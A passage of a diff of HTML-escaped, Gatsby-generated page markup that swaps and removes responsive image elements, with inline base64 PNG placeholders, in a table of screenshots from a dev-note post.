4PQTZEmSXDMQa6UQlw6dO5PcOxYTgEFdGGUd/GDGnfhwXt+zG3Yx9WdRxBSBHPyxSZSmkuIw0rm4NLK0vTykSptEtb4302HbRicR7NdVCN4tmuk3jy3yfw9K2TWNNzAs/3/EagMFNMHWoiiiQt3zaNYGkSc4V8AeVSFUi1lT0cz5QACi2s5uI2TG3bUYWSZoXLlKgiUgVUoagTUHI01f+xr5GxiUyZdbOaKa3VTDH7O+BceBv2pd8h+fHbMD9j1qS9AIhtu3RvPyAtMKR1GYOlfJEzlLAhlJadqL3EsLnRxBkyU5T/3IBy9gSSn7yFoX/8CtGOfyKu6ogFYOIVKNwShc5ucDukX8xkUItidecbeLznKFb2/ALLeo7gR92/JmXdCKBEzRRtPQUr4yGTvVdbMqxkAaBseqL1GUIRdRjL2g/TEw9iSedhpuFBPNN5/B4UjV6oss5mUk6wNDGD8VaABFlTmgxFw/e7XkYtM6X2/DbUtO3CIlmyQDGz5SBbLK8M1y9DVSuZohKOgBlPwQBKeRKUjlcw8/ouzLm2Gw/d3I2GLsmUvhtwzx6B+/FxqH8/huT5d4J8dliw7Kp9eSz4UqslW6QcFHMFKK6GOSxMU65sQ21zE6bcbKLBvka3udOG2IXfI3HlXQxeeBfh5vcxzKPGEMvqYHQYCcKQMhEX82CpGGasChxxmw10m6cY0OvoNmvpOpvFbVRal+WVEJdMIRjHKyBfYGCzNovkOsfCHihXaUsFQjQqfjgv8MMD9/xQoEh2iH1pUvTphymeZ7JML4k90X1uQ2uTPZS6/EgAZRemn9+OWkIJyqhN+7IZyKZTKfJpBnJwrqE7G9XD02Qo0kqhj3PAOhrCrOZdeLh5DzNmNxolU4zPL8L+cDecv+xjCXgZ8XO/5cY7HNDh6cEmCD+YrcWtkdlqPE0U/HyQy7WtO/DA1c14sHkrHrixJaAe0qJ90G+dg3brX1C6WV8IST5SRVqluDuMTYuuLtIZsykST/DEcbTvNA59cQqH757Gwbvv4WTfR1wyw0N3s4y/IoHkkTSsoDZLmDgs6JK7Ko90IrmWPnkuyho8WKX8CRVYgkOSl3IOTMvLjDGVhUqgBKJrp+XwqVdqtFyPP5MfKixwlsQsv7XlR9R/Ac7MrIgsofQZAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
+    style=&quot;padding-bottom: 205.66666666666666%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,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&apos;); background-size: cover; display: block;&quot;
   &gt;&lt;/span&gt;
   &lt;img
         class=&quot;gatsby-resp-image-image&quot;
-        alt=&quot;img05&quot;
-        title=&quot;img05&quot;
-        src=&quot;/static/a5627d270b4c675d791d2ee21e3c3234/72799/img05.png&quot;
-        srcset=&quot;/static/a5627d270b4c675d791d2ee21e3c3234/5a46d/img05.png 300w,
-/static/a5627d270b4c675d791d2ee21e3c3234/72799/img05.png 320w&quot;
+        alt=&quot;img06&quot;
+        title=&quot;img06&quot;
+        src=&quot;/static/781ff9ba1a57f9f02837f18e6bfcc310/72799/img06.png&quot;
+        srcset=&quot;/static/781ff9ba1a57f9f02837f18e6bfcc310/5a46d/img06.png 300w,
+/static/781ff9ba1a57f9f02837f18e6bfcc310/72799/img06.png 320w&quot;
         sizes=&quot;(max-width: 320px) 100vw, 320px&quot;
         style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
         loading=&quot;lazy&quot;
@@ -4208,26 +5419,6 @@ parameters [&apos;2017-11-27 14:25:08.67&apos;,&apos;admin@admin.com&apos;,&apos
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
-&lt;td align=&quot;center&quot;&gt;&lt;span
-      class=&quot;gatsby-resp-image-wrapper&quot;
-      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 320px; &quot;
-    &gt;
-      &lt;span
-    class=&quot;gatsby-resp-image-background-image&quot;
-    style=&quot;padding-bottom: 205.66666666666666%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,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&apos;); background-size: cover; display: block;&quot;
-  &gt;&lt;/span&gt;
-  &lt;img
-        class=&quot;gatsby-resp-image-image&quot;
-        alt=&quot;img06&quot;
-        title=&quot;img06&quot;
-        src=&quot;/static/781ff9ba1a57f9f02837f18e6bfcc310/72799/img06.png&quot;
-        srcset=&quot;/static/781ff9ba1a57f9f02837f18e6bfcc310/5a46d/img06.png 300w,
-/static/781ff9ba1a57f9f02837f18e6bfcc310/72799/img06.png 320w&quot;
-        sizes=&quot;(max-width: 320px) 100vw, 320px&quot;
-        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
-        loading=&quot;lazy&quot;
-      /&gt;
-    &lt;/span&gt;&lt;/td&gt;
 &lt;td align=&quot;center&quot;&gt;&lt;span
       class=&quot;gatsby-resp-image-wrapper&quot;
       style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 320px; &quot;
@@ -4268,6 +5459,7 @@ parameters [&apos;2017-11-27 14:25:08.67&apos;,&apos;admin@admin.com&apos;,&apos
         loading=&quot;lazy&quot;
       /&gt;
     &lt;/span&gt;&lt;/td&gt;
+&lt;td align=&quot;center&quot;&gt;&lt;img src=&quot;./images/171126-devnote/img09.png&quot;&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
 &lt;/table&gt;
